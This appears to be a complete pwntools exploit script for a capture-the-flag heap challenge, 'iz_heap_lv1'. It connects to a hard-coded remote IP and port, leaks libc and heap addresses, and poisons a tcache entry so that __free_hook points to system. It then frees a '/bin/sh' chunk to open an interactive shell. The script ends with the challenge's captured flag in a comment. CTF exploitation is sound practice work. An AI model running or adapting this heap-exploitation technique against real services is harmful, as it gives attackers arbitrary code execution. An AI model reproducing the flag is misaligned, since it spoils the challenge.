from pwn import *
def cmd(c):
	p.sendlineafter(": \n",str(c))
def name(n):
	p.sendafter(": ",n)
def add(size,c):
	cmd(1)
	p.sendlineafter(": ",str(size))
	p.sendafter(": ",c)
def free(idx):
	cmd(3)
	p.sendlineafter(": ",str(idx))
def edit(idx,size,c):
	cmd(2)
	p.sendlineafter(": ",str(idx))
	p.sendlineafter(": ",str(size))
	p.sendafter(": ",c)
def show(n="n132",flag="N"):
	cmd(4)
	p.sendlineafter(")",str(flag))
	if flag=='Y':
		p.sendafter(": ",n)
def index(add):
	return (add-0x000000000602060)/8
libc=ELF("./libc.so.6")
#
#p=process('./iz_heap_lv1',env={"LD_PRELOAD":"./libc.so.6"})
p=remote("165.22.110.249",3333)
name("\x00"*8)
edit(20,0x300000,"n132")
show()
p.readuntil("Name: ")
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x00007ff681b04010-0x00007ff681e05000)
log.warning(hex(base))

edit(20,0x18,'n132')
show()
p.readuntil("Name: ")
heap=u64(p.readline()[:-1].ljust(8,'\x00'))-0x260
log.warning(hex(heap))

libc.address=base
edit(0,0x18,p64(heap+0x260))
free(index(heap+0x260+0x20))
free(20)
edit(1,0x18,p64(libc.sym['__free_hook']))
edit(2,0x18,"/bin/sh\x00")
edit(3,0x18,p64(libc.sym['system']))

context.log_level='debug'
free(2)

#gdb.attach(p,'b *0x000000000400B24')
#ISITDTU{d800dab9684113a5d6c7d2c0381b48c1553068bc}
p.interactive()
